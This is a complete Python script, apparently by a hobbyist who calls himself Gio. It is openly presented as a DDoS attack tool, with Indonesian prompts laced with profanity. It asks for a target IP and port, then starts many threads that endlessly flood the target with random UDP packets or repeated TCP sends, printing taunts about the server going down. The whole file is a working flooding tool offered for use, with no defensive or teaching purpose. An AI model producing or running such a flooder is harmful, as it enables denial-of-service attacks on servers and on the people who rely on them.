#!/usr/bin/env python3
#Semoga Tembus Ya Dek
#Ddos by Gio
#Join My T3Am : 
import random
import socket
import threading
import os

ip = str(input(" DdosAttackByGioDeveloper | Ip nya Masukin ajing:"))
port = int(input(" DdosAttackByGioDeveloper | Port juga tod:"))
choice = str(input(" DdosAttackByGioDeveloper | Gas ddos ga nih tod?(y/n):"))
times = int(input(" DdosAttackByGioDeveloper | Packet nya isi tod:"))
threads = int(input(" DdosAttackByGioDeveloper | Threads nya juga ye anjing:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | GIODEVELOPER |")
		except:
			print("[!] | Server down kontol!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Gio  nih Dekk!!!")
		except:
			s.close()
			print("[*] Yailah Down awoawkowko")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
